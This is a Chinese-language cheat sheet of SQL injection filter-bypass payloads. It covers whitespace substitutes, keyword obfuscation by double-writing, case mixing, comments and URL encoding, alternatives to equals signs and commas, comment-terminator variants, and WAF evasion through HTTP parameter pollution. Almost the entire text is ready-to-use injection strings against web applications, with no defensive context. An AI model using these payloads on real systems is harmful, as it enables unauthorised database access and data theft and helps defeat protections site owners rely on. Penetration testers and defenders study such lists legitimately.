# SQL 注入绕过技巧

## 空格过滤
```sql
+ 绕过：%09 %0a %0c %0d %20 %a0 /**/
?id=1%0aunion%0aselect%0a1,2,3
?id=1/**/union/**/select/**/1,2,3
```

## 关键字过滤
```sql
# 双写绕过
?id=1 uniunionon selselectect 1,2,3

# 大小写绕过
?id=1 UnIoN SeLeCt 1,2,3

# 注释分割
?id=1 uni/**/on sel/**/ect 1,2,3

# 编码绕过
?id=1 /*!union*/ /*!select*/ 1,2,3
?id=1 %75%6e%69%6f%6e%20%73%65%6c%65%63%74 1,2,3
```

## 等于号过滤
```sql
?id=1 and ascii(mid(user(),1,1))>1    # 大于小于
?id=1 and (substr(user(),1,1)= 'a')   # 括号字符比对
?id=1 and user() like 'r%'            # like
?id=1 and user() regexp '^r'          # 正则
?id=1 and user() between 'a' and 'z'  # between
```

## 逗号过滤
```sql
# limit 替代
select * from user limit 1 offset 1

# substring 绕过
select * from user where id=1 and substr(user() from 1 for 1)='r'

# union 绕过
?id=1 union select * from (select 1)a join (select 2)b join (select 3)c
```

## 注释符过滤
```sql
# 使用 --+ 或 # 被过滤
?id=1 union select 1,2,3-- -
?id=1 union select 1,2,3%23
?id=1 union select 1,2,3;%00
```

## 函数替代
```sql
# substr → substring / mid
# ord → ascii
# @@datadir → @@tmpdir
# information_schema → sys.schema_auto_increment_columns
```

## WAF 绕过
```sql
# 参数污染（多个同名参数）
?id=1&id=2&id=3+union+select+...
?id[]=1&id[]=2+union+select+...

# HTTP 参数污染（HPP）
?id=1+union+/*&id=*/select+1,2,3

# 请求方式绕过
GET → POST
POST → application/json
```
